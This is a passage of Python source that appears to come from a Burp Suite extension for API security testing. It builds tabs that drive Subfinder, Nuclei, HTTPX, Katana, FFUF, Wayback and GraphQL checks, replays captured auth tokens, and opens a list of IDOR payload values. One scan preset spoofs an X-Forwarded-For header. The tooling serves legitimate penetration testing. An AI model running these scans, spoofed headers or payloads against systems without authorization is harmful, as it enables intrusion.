        controls.add(JLabel("Profile:"))
        self.asset_profile_combo = JComboBox(self._profile_labels())
        self.asset_profile_combo.setSelectedItem("Balanced")
        controls.add(self.asset_profile_combo)
        controls.add(JLabel("Subfinder Path:"))
        self.asset_subfinder_path_field = JTextField(
            os.path.expanduser("~/go/bin/subfinder"), 22
        )
        controls.add(self.asset_subfinder_path_field)
        self.asset_custom_cmd_checkbox = JCheckBox("Enable Custom", False)
        controls.add(self.asset_custom_cmd_checkbox)
        controls.add(JLabel("Command:"))
        self.asset_custom_cmd_field = JTextField("", 35)
        self.asset_custom_cmd_field.setToolTipText(
            "Example: {subfinder_path} -dL {domains_file} -silent -o {output_file}"
        )
        controls.add(self.asset_custom_cmd_field)
        controls.add(JLabel("Preset:"))
        self.asset_preset_help_label = JLabel(
            "Preset Help: Choose a Subfinder command template."
        )
        asset_presets = [
            (
                "Silent Domain List",
                "{subfinder_path} -dL {domains_file} -silent -o {output_file}",
                "Recommended baseline using domain list input and silent output.",
            ),
            (
                "Recursive",
                "{subfinder_path} -dL {domains_file} -silent -recursive -o {output_file}",
                "Adds recursive enumeration for deeper subdomain coverage.",
            ),
            (
                "All Sources",
                "{subfinder_path} -dL {domains_file} -silent -all -o {output_file}",
                "Queries all supported passive sources for max coverage.",
            ),
        ]
        controls.add(
            self._create_command_preset_combo(
                self.asset_custom_cmd_field,
                self.asset_custom_cmd_checkbox,
                asset_presets,
                self.asset_preset_help_label,
            )
        )
        controls.add(
            self._create_preset_help_button(
                "Subfinder",
                ["{subfinder_path}", "{domains_file}", "{output_file}"],
                asset_presets,
                usage_notes=[
                    "Use local ProjectDiscovery subfinder binary in Subfinder Path.",
                    "Leave domains empty to auto-derive base domains from Recon hosts.",
                ],
                override_notes=[
                    "Include {output_file} so this tab can parse discovered assets.",
                    "Include {domains_file} if you want Recon-derived domains as input.",
                ],
            )
        )

        actions_row = JPanel(FlowLayout(FlowLayout.LEFT))
        actions_row.add(
            self._create_action_button(
                "Run Subfinder",
                Color(138, 43, 226),
                lambda e: self._run_api_asset_discovery(e),
            )
        )
        actions_row.add(
            self._create_action_button(
                "Stop", Color(255, 140, 0), lambda e: self._stop_asset_discovery(e)
            )
        )
        self._add_force_kill_button(
            actions_row, lambda: getattr(self, "asset_area", None)
        )
        actions_row.add(
            self._create_action_button(
                "Send to Recon",
                Color(76, 175, 80),
                lambda e: self._send_asset_discovery_to_recon(),
            )
        )
        actions_row.add(
            self._create_action_button(
                "Export Results",
                Color(70, 130, 180),
                lambda e: self._export_asset_discovery_results(),
            )
        )
        actions_row.add(
            self._create_action_button(
                "Clear", Color(108, 117, 125), lambda e: self.asset_area.setText("")
            )
        )
        actions_row.add(
            self._create_action_button(
                "Copy",
                Color(96, 125, 139),
                lambda e: self._copy_to_clipboard(self.asset_area.getText()),
            )
        )
        help_row = JPanel(FlowLayout(FlowLayout.LEFT))
        help_row.add(self.asset_preset_help_label)

        top_panel.add(controls)
        top_panel.add(actions_row)
        top_panel.add(help_row)
        panel.add(top_panel, BorderLayout.NORTH)
        self.asset_area, scroll = self._create_text_area_panel()
        panel.add(scroll, BorderLayout.CENTER)
        self.asset_discovered = []
        self.asset_target_candidates = []
        self.asset_selected_domains = []
        self.asset_lock = threading.Lock()
        self._autopopulate_asset_domains_from_history(
            overwrite=False, append_output=False
        )
        return panel

    def _create_openapi_drift_tab(self):
        """Create OpenAPI drift analysis tab (observed traffic vs spec)."""
        panel = JPanel(BorderLayout())
        top_panel = JPanel()
        top_panel.setLayout(BoxLayout(top_panel, BoxLayout.Y_AXIS))

        controls = JPanel(FlowLayout(FlowLayout.LEFT))
        controls.add(JLabel("OpenAPI/Swagger File or URL:"))
        self.openapi_spec_field = JTextField("", 40)
        self.openapi_spec_field.setToolTipText(
            "Local file path (.json/.yaml) or URL to OpenAPI document"
        )
        controls.add(self.openapi_spec_field)
        controls.add(
            self._create_action_button(
                "Browse",
                Color(96, 125, 139),
                lambda e: self._browse_openapi_spec_file(),
            )
        )
        controls.add(
            self._create_action_button(
                "Detect",
                Color(70, 130, 180),
                lambda e: self._detect_openapi_spec_from_history(e),
            )
        )
        controls.add(
            self._create_action_button(
                "Show Targets",
                Color(70, 130, 180),
                lambda e: self._show_openapi_spec_targets_popup(e),
            )
        )
        controls.add(
            self._create_action_button(
                "Run Drift", Color(138, 43, 226), lambda e: self._run_openapi_drift(e)
            )
        )
        controls.add(
            self._create_action_button(
                "Stop", Color(255, 140, 0), lambda e: self._stop_openapi_drift(e)
            )
        )
        self._add_force_kill_button(controls, lambda: getattr(self, "openapi_area", None))
        controls.add(
            self._create_action_button(
                "Send to Recon",
                Color(76, 175, 80),
                lambda e: self._send_openapi_to_recon(),
            )
        )
        controls.add(
            self._create_action_button(
                "Export Results",
                Color(70, 130, 180),
                lambda e: self._export_openapi_drift_results(),
            )
        )
        controls.add(
            self._create_action_button(
                "Clear", Color(108, 117, 125), lambda e: self.openapi_area.setText("")
            )
        )
        controls.add(
            self._create_action_button(
                "Copy",
                Color(96, 125, 139),
                lambda e: self._copy_to_clipboard(self.openapi_area.getText()),
            )
        )

        help_row = JPanel(FlowLayout(FlowLayout.LEFT))
        help_row.add(
            JLabel(
                "Flags undocumented observed endpoints, missing spec endpoints, and parameter drift."
            )
        )

        top_panel.add(controls)
        top_panel.add(help_row)
        panel.add(top_panel, BorderLayout.NORTH)
        self.openapi_area, scroll = self._create_text_area_panel()
        panel.add(scroll, BorderLayout.CENTER)
        self.openapi_drift_results = []
        self.openapi_missing_candidates = []
        self.openapi_spec_candidates = []
        self.openapi_selected_spec_targets = []
        self.openapi_lock = threading.Lock()
        self._autoselect_openapi_spec_from_history(append_output=False)
        return panel

    def _create_auth_replay_tab(self):
        """Create Auth Replay tab for multi-role authorization checks."""
        panel = JPanel(BorderLayout())
        top_panel = JPanel()
        top_panel.setLayout(BoxLayout(top_panel, BoxLayout.Y_AXIS))

        controls = JPanel(FlowLayout(FlowLayout.LEFT))
        controls.add(JLabel("Scope:"))
        self.auth_replay_scope_combo = JComboBox(
            ["Selected Endpoint", "Filtered View", "All Endpoints"]
        )
        controls.add(self.auth_replay_scope_combo)
        controls.add(JLabel("Max:"))
        self.auth_replay_max_field = JTextField("50", 4)
        controls.add(self.auth_replay_max_field)
        controls.add(
            self._create_action_button(
                "Run Replay", Color(220, 53, 69), lambda e: self._run_auth_replay(e)
            )
        )
        controls.add(
            self._create_action_button(
                "Stop", Color(255, 140, 0), lambda e: self._stop_auth_replay(e)
            )
        )
        controls.add(
            self._create_action_button(
                "Clear",
                Color(108, 117, 125),
                lambda e: self.auth_replay_area.setText(""),
            )
        )
        controls.add(
            self._create_action_button(
                "Copy",
                Color(70, 130, 180),
                lambda e: self._copy_to_clipboard(self.auth_replay_area.getText()),
            )
        )

        guest_row = JPanel(FlowLayout(FlowLayout.LEFT))
        guest_row.add(JLabel("Guest Header:"))
        self.auth_guest_header_field = JTextField("", 58)
        self.auth_guest_header_field.setToolTipText(
            "Optional. Format: Header-Name: value (example: Cookie: session=...)"
        )
        guest_row.add(self.auth_guest_header_field)
        guest_row.add(
            self._create_action_button(
                "Extract",
                Color(40, 167, 69),
                lambda e: self._extract_auth_profile_header("guest"),
            )
        )

        user_row = JPanel(FlowLayout(FlowLayout.LEFT))
        user_row.add(JLabel("User Header:"))
        self.auth_user_header_field = JTextField("", 59)
        self.auth_user_header_field.setToolTipText(
            "Optional but recommended. Format: Authorization: Bearer <user_token>"
        )
        user_row.add(self.auth_user_header_field)
        user_row.add(
            self._create_action_button(
                "Extract",
                Color(40, 167, 69),
                lambda e: self._extract_auth_profile_header("user"),
            )
        )

        admin_row = JPanel(FlowLayout(FlowLayout.LEFT))
        admin_row.add(JLabel("Admin Header:"))
        self.auth_admin_header_field = JTextField("", 57)
        self.auth_admin_header_field.setToolTipText(
            "Optional but recommended. Format: Authorization: Bearer <admin_token>"
        )
        admin_row.add(self.auth_admin_header_field)
        admin_row.add(
            self._create_action_button(
                "Extract",
                Color(40, 167, 69),
                lambda e: self._extract_auth_profile_header("admin"),
            )
        )

        help_row = JPanel(FlowLayout(FlowLayout.LEFT))
        help_row.add(
            JLabel(
                "Use header format 'Name: value'. Extract opens a searchable popup picker from captured headers."
            )
        )

        top_panel.add(controls)
        top_panel.add(guest_row)
        top_panel.add(user_row)
        top_panel.add(admin_row)
        top_panel.add(help_row)
        panel.add(top_panel, BorderLayout.NORTH)

        self.auth_replay_area, scroll = self._create_text_area_panel()
        panel.add(scroll, BorderLayout.CENTER)
        self.auth_replay_findings = []
        self.auth_replay_lock = threading.Lock()
        return panel

    def _create_passive_discovery_tab(self):
        """Create passive discovery tab based on captured/replayed proxy history."""
        panel = JPanel(BorderLayout())
        top_panel = JPanel()
        top_panel.setLayout(BoxLayout(top_panel, BoxLayout.Y_AXIS))

        controls = JPanel(FlowLayout(FlowLayout.LEFT))
        controls.add(JLabel("Scope:"))
        self.passive_scope_combo = JComboBox(
            ["Selected Endpoint", "Filtered View", "All Endpoints"]
        )
        self.passive_scope_combo.setSelectedItem("All Endpoints")
        controls.add(self.passive_scope_combo)
        controls.add(JLabel("Mode:"))
        self.passive_mode_combo = JComboBox(
            [
                "All",
                "API5 (BFLA)",
                "API3 (Data)",
                "API4 (Resource)",
                "API6 (Flows)",
                "API9 (Version)",
                "API10 (Consumption)",
            ]
        )
        controls.add(self.passive_mode_combo)
        controls.add(JLabel("Max:"))
        self.passive_max_field = JTextField("250", 4)
        controls.add(self.passive_max_field)
        controls.add(
            self._create_action_button(
                "Run Passive", Color(40, 167, 69), lambda e: self._run_passive_discovery(e)
            )
        )
        controls.add(
            self._create_action_button(
                "Export",
                Color(70, 130, 180),
                lambda e: self._export_passive_discovery_results(),
            )
        )
        controls.add(
            self._create_action_button(
                "Clear",
                Color(220, 53, 69),
                lambda e: self.passive_area.setText(""),
            )
        )
        controls.add(
            self._create_action_button(
                "Copy",
                Color(108, 117, 125),
                lambda e: self._copy_to_clipboard(self.passive_area.getText()),
            )
        )

        help_row = JPanel(FlowLayout(FlowLayout.LEFT))
        help_row.add(
            JLabel(
                "Passive only: analyzes captured/replayed proxy history. No active requests are sent."
            )
        )

        top_panel.add(controls)
        top_panel.add(help_row)
        panel.add(top_panel, BorderLayout.NORTH)

        self.passive_area, scroll = self._create_text_area_panel()
        panel.add(scroll, BorderLayout.CENTER)
        self.passive_discovery_findings = []
        return panel

    def _create_nuclei_tab(self):
        """Create Nuclei scanner tab"""
        panel = JPanel(BorderLayout())
        top_panel = JPanel()
        top_panel.setLayout(BoxLayout(top_panel, BoxLayout.Y_AXIS))

        controls = JPanel(FlowLayout(FlowLayout.LEFT))
        controls.add(JLabel("Nuclei Path:"))
        import os

        nuclei_candidates = [
            os.path.expanduser("~/go/bin/nuclei"),
            os.path.expanduser("~/go/bin/nuclei.exe"),
            "nuclei.exe" if os.name == "nt" else "nuclei",
            "nuclei",
        ]
        default_nuclei = next(
            (p for p in nuclei_candidates if os.path.exists(p)),
            "nuclei.exe" if os.name == "nt" else "nuclei",
        )
        self.nuclei_path_field = JTextField(
            default_nuclei, 25
        )
        controls.add(self.nuclei_path_field)
        self.nuclei_custom_cmd_checkbox = JCheckBox("Enable Custom", False)
        controls.add(self.nuclei_custom_cmd_checkbox)
        controls.add(JLabel("Command:"))
        self.nuclei_custom_cmd_field = JTextField("", 35)
        self.nuclei_custom_cmd_field.setToolTipText(
            "Example: {nuclei_path} -list {targets_file} -jsonl-export {json_file} -silent"
        )
        controls.add(self.nuclei_custom_cmd_field)
        controls.add(JLabel("Preset:"))
        self.nuclei_preset_help_label = JLabel(
            "Preset Help: Choose preset for quick safe command templates."
        )
        nuclei_presets = [
            (
                "Recon Fast",
                '{nuclei_path} -list {targets_file} -tags swagger,openapi,graphql -etags dos,intrusive,headless,cve,fuzz,fuzzing,brute-force -timeout 8 -retries 1 -rate-limit 100 -c 20 -bs 8 -mhe 8 -ss host-spray -no-httpx -project -silent -header "X-Forwarded-For: 127.0.0.1" -jsonl-export {json_file}',
                "Optimized for speed: only core API discovery tags.",
            ),
            (
                "High/Critical",
                "{nuclei_path} -list {targets_file} -severity critical,high -timeout 12 -retries 2 -rate-limit 40 -c 8 -silent -jsonl-export {json_file}",
                "Prioritizes only high and critical findings for quick triage.",
            ),
            (
                "API/Auth Focus",
                "{nuclei_path} -list {targets_file} -tags swagger,openapi,graphql,auth,jwt,config -timeout 10 -retries 2 -rate-limit 45 -c 8 -silent -jsonl-export {json_file}",
                "Targets API/authentication and configuration checks with focused templates.",
            ),
        ]
        controls.add(
            self._create_command_preset_combo(
                self.nuclei_custom_cmd_field,
                self.nuclei_custom_cmd_checkbox,
                nuclei_presets,
                self.nuclei_preset_help_label,
            )
        )
        controls.add(
            self._create_preset_help_button(
                "Nuclei",
                ["{nuclei_path}", "{targets_file}", "{output_file}", "{json_file}"],
                nuclei_presets,
                usage_notes=[
                    "Use local ProjectDiscovery nuclei binary in Nuclei Path.",
                    "Default mode scans scoped first-party Recon targets (base URLs + API paths).",
                    "Use tags and etags presets for fast API-focused coverage.",
                ],
                override_notes=[
                    "Include {json_file} so results can be parsed in this tab.",
                    "Preferred JSON output flag: -jsonl-export {json_file}.",
                    "Include {targets_file} if you want to keep Recon-derived target scope.",
                    "Avoid unsupported flags for your local version (for example: -random-agent).",
                ],
            )
        )
        controls.add(JLabel("Profile:"))
        self.nuclei_profile_combo = JComboBox(self._profile_labels())
        self.nuclei_profile_combo.setSelectedItem("Fast")
        controls.add(self.nuclei_profile_combo)
        self._add_target_scope_controls(controls)
        controls.add(
            self._create_action_button(
                "Run Nuclei", Color(138, 43, 226), lambda e: self._run_nuclei()
            )
        )
        controls.add(
            self._create_action_button(
                "Stop", Color(255, 140, 0), lambda e: self._stop_nuclei(e)
            )
        )
        self._add_force_kill_button(controls, lambda: getattr(self, "nuclei_area", None))
        controls.add(
            self._create_action_button(
                "Export Targets",
                Color(70, 130, 180),
                lambda e: self._export_nuclei_targets(),
            )
        )
        controls.add(
            self._create_action_button(
                "Clear", Color(220, 53, 69), lambda e: self.nuclei_area.setText("")
            )
        )
        controls.add(
            self._create_action_button(
                "Copy",
                Color(108, 117, 125),
                lambda e: self._copy_to_clipboard(self.nuclei_area.getText()),
            )
        )

        help_row = JPanel(FlowLayout(FlowLayout.LEFT))
        help_row.add(self.nuclei_preset_help_label)
        top_panel.add(controls)
        top_panel.add(help_row)
        panel.add(top_panel, BorderLayout.NORTH)

        self.nuclei_area, scroll = self._create_text_area_panel()
        panel.add(scroll, BorderLayout.CENTER)
        return panel

    def _create_httpx_tab(self):
        """Create HTTPX probe tab"""
        panel = JPanel(BorderLayout())
        top_panel = JPanel()
        top_panel.setLayout(BoxLayout(top_panel, BoxLayout.Y_AXIS))

        controls = JPanel(FlowLayout(FlowLayout.LEFT))
        controls.add(JLabel("HTTPX Path:"))
        import os

        httpx_paths = [
            os.path.expanduser("~/go/bin/httpx"),
            os.path.expanduser("~/go/bin/httpx.exe"),
            "/usr/local/bin/httpx",
            "httpx.exe" if os.name == "nt" else "httpx",
            "httpx",
        ]
        default_httpx = next(
            (p for p in httpx_paths if os.path.exists(p)),
            "httpx.exe" if os.name == "nt" else "httpx",
        )
        self.httpx_path_field = JTextField(default_httpx, 25)
        controls.add(self.httpx_path_field)
        self.httpx_custom_cmd_checkbox = JCheckBox("Enable Custom", False)
        controls.add(self.httpx_custom_cmd_checkbox)
        controls.add(JLabel("Command:"))
        self.httpx_custom_cmd_field = JTextField("", 35)
        self.httpx_custom_cmd_field.setToolTipText(
            "Example: {httpx_path} -l {urls_file} -status-code -nc -silent"
        )
        controls.add(self.httpx_custom_cmd_field)
        controls.add(JLabel("Preset:"))
        self.httpx_preset_help_label = JLabel(
            "Preset Help: Choose preset for common HTTP probe profiles."
        )
        httpx_presets = [
            (
                "Status+NoColor",
                "{httpx_path} -l {urls_file} -status-code -nc -silent",
                "Basic status-code probe with clean output formatting.",
            ),
            (
                "Status+Title",
                "{httpx_path} -l {urls_file} -status-code -title -nc -silent",
                "Adds page titles alongside status codes for faster endpoint review.",
            ),
            (
                "Tech+Server",
                "{httpx_path} -l {urls_file} -status-code -tech-detect -server -nc -silent",
                "Includes technology and server fingerprinting with status codes.",
            ),
        ]
        controls.add(
            self._create_command_preset_combo(
                self.httpx_custom_cmd_field,
                self.httpx_custom_cmd_checkbox,
                httpx_presets,
                self.httpx_preset_help_label,
            )
        )
        controls.add(
            self._create_preset_help_button(
                "HTTPX",
                ["{httpx_path}", "{urls_file}"],
                httpx_presets,
                usage_notes=[
                    "Use local ProjectDiscovery httpx binary, not Python httpx CLI.",
                    "Default mode probes status codes for URLs exported from Recon.",
                    "Use presets to add title, tech-detect, and server fingerprint output.",
                ],
                override_notes=[
                    "Include {urls_file} if you want to probe Recon-derived URLs.",
                    "If binary check fails, set HTTPX Path to /home/teycir/go/bin/httpx.",
                ],
            )
        )
        controls.add(
            self._create_action_button(
                "Probe Endpoints", Color(0, 150, 136), lambda e: self._run_httpx(e)
            )
        )
        controls.add(
            self._create_action_button(
                "Stop", Color(255, 140, 0), lambda e: self._stop_httpx(e)
            )
        )
        self._add_force_kill_button(controls, lambda: getattr(self, "httpx_area", None))
        controls.add(
            self._create_action_button(
                "Export URLs", Color(70, 130, 180), lambda e: self._export_httpx_urls()
            )
        )
        controls.add(
            self._create_action_button(
                "Clear", Color(220, 53, 69), lambda e: self.httpx_area.setText("")
            )
        )
        controls.add(
            self._create_action_button(
                "Copy",
                Color(108, 117, 125),
                lambda e: self._copy_to_clipboard(self.httpx_area.getText()),
            )
        )

        help_row = JPanel(FlowLayout(FlowLayout.LEFT))
        help_row.add(self.httpx_preset_help_label)
        top_panel.add(controls)
        top_panel.add(help_row)
        panel.add(top_panel, BorderLayout.NORTH)

        self.httpx_area, scroll = self._create_text_area_panel()
        panel.add(scroll, BorderLayout.CENTER)
        return panel

    def _create_katana_tab(self):
        """Create Katana crawler tab"""
        panel = JPanel(BorderLayout())
        top_panel = JPanel()
        top_panel.setLayout(BoxLayout(top_panel, BoxLayout.Y_AXIS))

        controls = JPanel(FlowLayout(FlowLayout.LEFT))
        controls.add(JLabel("Katana Path:"))
        import os

        katana_candidates = [
            os.path.expanduser("~/go/bin/katana"),
            os.path.expanduser("~/go/bin/katana.exe"),
            "katana.exe" if os.name == "nt" else "katana",
            "katana",
        ]
        default_katana = next(
            (p for p in katana_candidates if os.path.exists(p)),
            "katana.exe" if os.name == "nt" else "katana",
        )
        self.katana_path_field = JTextField(
            default_katana, 25
        )
        controls.add(self.katana_path_field)
        self.katana_custom_cmd_checkbox = JCheckBox("Enable Custom", False)
        controls.add(self.katana_custom_cmd_checkbox)
        controls.add(JLabel("Command:"))
        self.katana_custom_cmd_field = JTextField("", 35)
        self.katana_custom_cmd_field.setToolTipText(
            "Example: {katana_path} -list {urls_file} -d 1 -jc -silent"
        )
        controls.add(self.katana_custom_cmd_field)
        controls.add(JLabel("Preset:"))
        self.katana_preset_help_label = JLabel(
            "Preset Help: Choose depth profile based on crawl coverage needs."
        )
        katana_presets = [
            (
                "Depth1 JSON",
                "{katana_path} -list {urls_file} -d 1 -jc -silent",
                "Fast shallow crawl (depth 1) with JSON-compatible output lines.",
            ),
            (
                "Depth2 JSON",
                "{katana_path} -list {urls_file} -d 2 -jc -silent",
                "Balanced crawl depth for wider endpoint discovery.",
            ),
            (
                "Depth3 URL",
                "{katana_path} -list {urls_file} -d 3 -silent",
                "Deeper crawl for maximum coverage; slower and noisier.",
            ),
        ]
        controls.add(
            self._create_command_preset_combo(
                self.katana_custom_cmd_field,
                self.katana_custom_cmd_checkbox,
                katana_presets,
                self.katana_preset_help_label,
            )
        )
        controls.add(
            self._create_preset_help_button(
                "Katana",
                ["{katana_path}", "{urls_file}"],
                katana_presets,
                usage_notes=[
                    "Default mode crawls hosts from Recon with depth 1 and JS crawl.",
                    "Use deeper presets for wider endpoint coverage with more runtime.",
                    "Discovered URLs can be imported back into Recon.",
                ],
                override_notes=[
                    "Include {urls_file} if you want to crawl Recon-derived hosts.",
                    "If {urls_file} is not used, custom command fully defines scope.",
                ],
            )
        )
        self._add_target_scope_controls(controls)
        controls.add(
            self._create_action_button(
                "Crawl Endpoints", Color(156, 39, 176), lambda e: self._run_katana(e)
            )
        )
        controls.add(
            self._create_action_button(
                "Stop", Color(255, 140, 0), lambda e: self._stop_katana(e)
            )
        )
        self._add_force_kill_button(controls, lambda: getattr(self, "katana_area", None))
        controls.add(
            self._create_action_button(
                "Export Discovered",
                Color(70, 130, 180),
                lambda e: self._export_katana_results(),
            )
        )
        controls.add(
            self._create_action_button(
                "Send to Recon",
                Color(76, 175, 80),
                lambda e: self._import_katana_to_recon(),
            )
        )
        controls.add(
            self._create_action_button(
                "Clear", Color(220, 53, 69), lambda e: self.katana_area.setText("")
            )
        )
        controls.add(
            self._create_action_button(
                "Copy",
                Color(108, 117, 125),
                lambda e: self._copy_to_clipboard(self.katana_area.getText()),
            )
        )

        help_row = JPanel(FlowLayout(FlowLayout.LEFT))
        help_row.add(self.katana_preset_help_label)
        top_panel.add(controls)
        top_panel.add(help_row)
        panel.add(top_panel, BorderLayout.NORTH)

        self.katana_area, scroll = self._create_text_area_panel()
        panel.add(scroll, BorderLayout.CENTER)
        self.katana_discovered = []
        self.katana_lock = threading.Lock()
        return panel

    def _create_ffuf_tab(self):
        """Create FFUF fuzzer tab"""
        panel = JPanel(BorderLayout())

        controls = JPanel(FlowLayout(FlowLayout.LEFT))
        controls.add(JLabel("FFUF Path:"))
        import os

        ffuf_candidates = [
            os.path.expanduser("~/go/bin/ffuf"),
            os.path.expanduser("~/go/bin/ffuf.exe"),
            "ffuf.exe" if os.name == "nt" else "ffuf",
            "ffuf",
        ]
        default_ffuf = next(
            (p for p in ffuf_candidates if os.path.exists(p)),
            "ffuf.exe" if os.name == "nt" else "ffuf",
        )
        self.ffuf_path_field = JTextField(
            default_ffuf, 20
        )
        controls.add(self.ffuf_path_field)
        controls.add(JLabel("Wordlist:"))
        import os

        default_wordlist = os.path.expanduser("~/wordlists/api-endpoints.txt")
        if not os.path.exists(default_wordlist):
            default_wordlist = os.path.expanduser("~/wordlists/common.txt")
        if not os.path.exists(default_wordlist):
            default_wordlist = "/usr/share/wordlists/dirb/common.txt"
        self.ffuf_wordlist_field = JTextField(default_wordlist, 20)
        controls.add(self.ffuf_wordlist_field)
        self._add_target_scope_controls(controls)
        controls.add(
            self._create_action_button(
                "Fuzz Directories", Color(255, 87, 34), lambda e: self._run_ffuf(e)
            )
        )
        controls.add(
            self._create_action_button(
                "Stop", Color(255, 140, 0), lambda e: self._stop_ffuf(e)
            )
        )
        self._add_force_kill_button(controls, lambda: getattr(self, "ffuf_area", None))
        controls.add(
            self._create_action_button(
                "Export Results",
                Color(70, 130, 180),
                lambda e: self._export_ffuf_results(),
            )
        )
        controls.add(
            self._create_action_button(
                "Send to Intruder",
                Color(255, 140, 0),
                lambda e: self._send_ffuf_to_intruder(),
            )
        )
        controls.add(
            self._create_action_button(
                "Clear", Color(220, 53, 69), lambda e: self.ffuf_area.setText("")
            )
        )
        controls.add(
            self._create_action_button(
                "Copy",
                Color(108, 117, 125),
                lambda e: self._copy_to_clipboard(self.ffuf_area.getText()),
            )
        )

        panel.add(controls, BorderLayout.NORTH)

        self.ffuf_area, scroll = self._create_text_area_panel()
        panel.add(scroll, BorderLayout.CENTER)
        self.ffuf_results = []
        self.ffuf_lock = threading.Lock()
        return panel

    def _create_wayback_tab(self):
        """Create Wayback Machine discovery tab"""
        import os

        panel = JPanel(BorderLayout())
        top_panel = JPanel()
        top_panel.setLayout(BoxLayout(top_panel, BoxLayout.Y_AXIS))
        stdin_prefix = "type" if os.name == "nt" else "cat"
        controls = JPanel(FlowLayout(FlowLayout.LEFT))
        controls.add(JLabel("Wayback:"))
        controls.add(
            self._create_action_button(
                "Discover", Color(138, 43, 226), lambda e: self._run_wayback()
            )
        )
        controls.add(
            self._create_action_button(
                "Stop", Color(255, 140, 0), lambda e: self._stop_wayback(e)
            )
        )
        self._add_force_kill_button(controls, lambda: getattr(self, "wayback_area", None))
        controls.add(
            self._create_action_button(
                "Send to Recon",
                Color(76, 175, 80),
                lambda e: self._import_wayback_to_recon(),
            )
        )
        controls.add(
            self._create_action_button(
                "Export Results",
                Color(70, 130, 180),
                lambda e: self._export_wayback_results(),
            )
        )
        controls.add(
            self._create_action_button(
                "Copy",
                Color(108, 117, 125),
                lambda e: self._copy_to_clipboard(self.wayback_area.getText()),
            )
        )
        controls.add(JLabel(" | From:"))
        self.wayback_from_field = JTextField("2020", 4)
        controls.add(self.wayback_from_field)
        controls.add(JLabel("To:"))
        self.wayback_to_field = JTextField(str(time.localtime().tm_year), 4)
        controls.add(self.wayback_to_field)
        controls.add(JLabel(" | Limit:"))
        self.wayback_limit_field = JTextField("50", 3)
        controls.add(self.wayback_limit_field)
        self.wayback_custom_cmd_checkbox = JCheckBox("Enable Custom", False)
        controls.add(self.wayback_custom_cmd_checkbox)
        controls.add(JLabel("Command:"))
        self.wayback_custom_cmd_field = JTextField("", 45)
        self.wayback_custom_cmd_field.setToolTipText(
            "Example: {} \"{{targets_file}}\" | waybackurls".format(stdin_prefix)
        )
        controls.add(self.wayback_custom_cmd_field)
        controls.add(JLabel("Preset:"))
        self.wayback_preset_help_label = JLabel(
            "Preset Help: Choose passive historical URL source command."
        )
        wayback_presets = [
            (
                "waybackurls",
                "{} \"{{targets_file}}\" | waybackurls".format(stdin_prefix),
                "Uses waybackurls to pull archived URLs from Wayback index.",
            ),
            (
                "gau",
                "{} \"{{targets_file}}\" | gau --subs".format(stdin_prefix),
                "Uses gau to gather historical URLs including subdomains.",
            ),
            (
                "gau+threads",
                "{} \"{{targets_file}}\" | gau --subs --threads 5".format(stdin_prefix),
                "Same as gau preset with thread tuning for faster collection.",
            ),
        ]
        controls.add(
            self._create_command_preset_combo(
                self.wayback_custom_cmd_field,
                self.wayback_custom_cmd_checkbox,
                wayback_presets,
                self.wayback_preset_help_label,
            )
        )
        controls.add(
            self._create_preset_help_button(
                "Wayback",
                ["{targets_file}", "{from_year}", "{to_year}", "{limit}"],
                wayback_presets,
                usage_notes=[
                    "Default mode queries Wayback CDX API for hosts and API base paths.",
                    "From/To/Limit fields control built-in query range and depth.",
                    "Preset commands use passive sources: waybackurls or gau.",
                ],
                override_notes=[
                    "Include {targets_file} if you want to use generated host/path list.",
                    "Custom output lines can be plain URLs or 'original | archive | timestamp'.",
                    "If custom command does not use {targets_file}, scope is fully custom.",
                ],
            )
        )
        self._add_target_scope_controls(controls)
        controls.add(
            self._create_action_button(
                "Clear", Color(220, 53, 69), lambda e: self.wayback_area.setText("")
            )
        )
        help_row = JPanel(FlowLayout(FlowLayout.LEFT))
        help_row.add(self.wayback_preset_help_label)
        top_panel.add(controls)
        top_panel.add(help_row)
        panel.add(top_panel, BorderLayout.NORTH)
        self.wayback_area, scroll = self._create_text_area_panel()
        panel.add(scroll, BorderLayout.CENTER)
        self.wayback_discovered = []
        self.wayback_lock = threading.Lock()
        return panel

    def _create_graphql_tab(self):
        """Create GraphQL analysis tab orchestrating external tool checks."""
        panel = JPanel(BorderLayout())
        top_panel = JPanel()
        top_panel.setLayout(BoxLayout(top_panel, BoxLayout.Y_AXIS))

        controls = JPanel(FlowLayout(FlowLayout.LEFT))
        controls.add(JLabel("Targets (comma/newline, optional):"))
        self.graphql_targets_field = JTextField("", 45)
        self.graphql_targets_field.setToolTipText(
            "Optional. Leave empty to auto-pick GraphQL endpoints from Recon history."
        )
        controls.add(self.graphql_targets_field)
        controls.add(JLabel("Max:"))
        self.graphql_max_targets_field = JTextField("12", 3)
        controls.add(self.graphql_max_targets_field)
        controls.add(
            self._create_action_button(
                "Show Targets",
                Color(70, 130, 180),
                lambda e: self._show_graphql_targets_popup(e),
            )
        )
        controls.add(
            self._create_action_button(
                "Run Analysis",
                Color(138, 43, 226),
                lambda e: self._run_graphql_analysis(e),
            )
        )
        controls.add(
            self._create_action_button(
                "Stop", Color(255, 140, 0), lambda e: self._stop_graphql(e)
            )
        )
        self._add_force_kill_button(controls, lambda: getattr(self, "graphql_area", None))
        controls.add(
            self._create_action_button(
                "Send to Recon",
                Color(76, 175, 80),
                lambda e: self._send_graphql_to_recon(),
            )
        )
        controls.add(
            self._create_action_button(
                "Export Results",
                Color(70, 130, 180),
                lambda e: self._export_graphql_results(),
            )
        )
        controls.add(
            self._create_action_button(
                "Clear", Color(220, 53, 69), lambda e: self.graphql_area.setText("")
            )
        )
        controls.add(
            self._create_action_button(
                "Copy",
                Color(108, 117, 125),
                lambda e: self._copy_to_clipboard(self.graphql_area.getText()),
            )
        )

        info_row = JPanel(FlowLayout(FlowLayout.LEFT))
        info_row.add(
            JLabel(
                "Runs: Subfinder, HTTPX, Katana, FFUF, Wayback, Nuclei, Dalfox, SQLMap (if available)."
            )
        )
        top_panel.add(controls)
        top_panel.add(info_row)
        panel.add(top_panel, BorderLayout.NORTH)

        self.graphql_area, scroll = self._create_text_area_panel()
        panel.add(scroll, BorderLayout.CENTER)
        self.graphql_results = []
        self.graphql_recon_candidates = []
        self.graphql_target_candidates = []
        self.graphql_selected_targets = []
        self.graphql_lock = threading.Lock()
        self._autopopulate_graphql_targets_from_history(
            overwrite=False, append_output=False
        )
        return panel

    # ============================================================================
    # PAYLOAD GENERATORS - NAVIGATION: Search "PAYLOAD GENERATORS" to jump here
    # ============================================================================

    def _get_idor_payloads(self, param_type="numeric"):
        if param_type == "uuid":
            return [
                "00000000-0000-0000-0000-000000000000",
                "ffffffff-ffff-ffff-ffff-ffffffffffff",
                "11111111-1111-1111-1111-111111111111",
                "aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa",
